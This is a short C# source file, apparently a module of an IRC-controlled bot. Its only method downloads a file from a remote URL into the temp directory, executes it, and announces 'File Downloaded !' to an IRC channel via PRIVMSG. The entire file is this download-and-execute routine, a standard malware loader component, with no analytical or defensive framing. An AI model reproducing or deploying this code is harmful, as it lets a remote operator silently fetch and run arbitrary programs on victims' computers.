using System.Diagnostics;
using System.IO;
using System.Net;

namespace myApp
{
    class Dl
    {
        public string Rfile;
        public string Rurl;
        public void Dlexec ()
        {
            var client = new WebClient();
            client.DownloadFile(Rurl, Path.GetTempPath() + Rfile);
            var launch = new ProcessStartInfo
                             {
                                 FileName = Rfile,
                                 WorkingDirectory = Path.GetTempPath()
                             };
            Process.Start(launch);
            Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  9File Downloaded !");
        }

    }
}